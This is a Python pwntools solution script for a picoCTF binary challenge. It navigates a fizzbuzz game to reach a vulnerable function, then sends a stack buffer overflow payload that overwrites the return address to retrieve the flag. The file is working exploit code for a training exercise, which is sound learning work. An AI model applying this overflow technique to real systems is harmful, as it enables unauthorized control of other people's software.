from pwn import *

c = remote('mercury.picoctf.net', 25546)
# c = process('./vuln')

def fb(v):
	if v == -1:
		print(c.recvuntil('? '))
		c.sendline('X')
		return
	for i in range(1, v):
		print(c.recvuntil('? '))
		if i % 15 == 0:
			# print('fizzbuzz')
			c.sendline('fizzbuzz')
		elif i % 3 == 0:
			# print('fizz')
			c.sendline('fizz')
		elif i % 5 == 0:
			# print('buzz')
			c.sendline('buzz')
		else:
			# print(str(i))
			c.sendline(str(i))

# main to TARGET_1
fb(4)
fb(7)
fb(2)
fb(9)
fb(0xc)
fb(3)
fb(0xc)
fb(4)
fb(7)
fb(0xd)
fb(0xc)
fb(0x12)
fb(0xf)
fb(3)
fb(0xc)
fb(0x10)
fb(0xe)
fb(9)
fb(0xc)
fb(0x10)
fb(0xd)
fb(0x11)
fb(6)
fb(0xe)
fb(7)
fb(10)
fb(0xf)
fb(0xd)
fb(7)
fb(8)
fb(0xd)
fb(0x11)
fb(0xb)
fb(0x12)
fb(0xb)

# TARGET_1 to TARGET_2
fb(-1)
fb(7)
fb(-1)
fb(0xd)
fb(-1)
fb(0xf)
fb(-1)
fb(7)
fb(-1)
fb(7)
fb(-1)
fb(0x10)
fb(-1)
fb(0x10)
fb(-1)
fb(10)
fb(-1)

# TARGET_2 to TARGET_3
fb(-1)
fb(2)
fb(-1)

# TARGET_3 to TARGET_4
fb(-1)
fb(3)
fb(-1)
fb(0x11)
fb(-1)
fb(0xd)
fb(-1)
fb(5)
fb(-1)
fb(7)
fb(-1)
fb(3)
fb(-1)
fb(7)
fb(-1)
fb(7)
fb(-1)
fb(6)
fb(-1)
fb(4)
fb(-1)
fb(0xc)
fb(-1)
fb(0xd)
fb(-1)
fb(5)
fb(-1)
fb(7)
fb(-1)
fb(0xd)
fb(-1)
fb(2)
fb(-1)
fb(0xc)
fb(-1)
fb(0xb)
fb(-1)
fb(9)
fb(-1)
fb(0xe)
fb(-1)
fb(4)
fb(-1)
fb(5)
fb(-1)

# TARGET_4 to OVERFLOW_FUNCTION
fb(5)
print(c.recvuntil('? '))

# Overflow the buffer
# gdb.attach(c)
padding = b'A'*87+b'CCCCDDDDEEEEFFFFGGGGHHHHIIIIJJ'
ebp = b'B'*4
eip = p32(0x08048656)
exp = padding + ebp + eip
c.sendline(exp)
print(c.recvuntil('? '))
print('FLAG:', c.recvall().decode().strip())
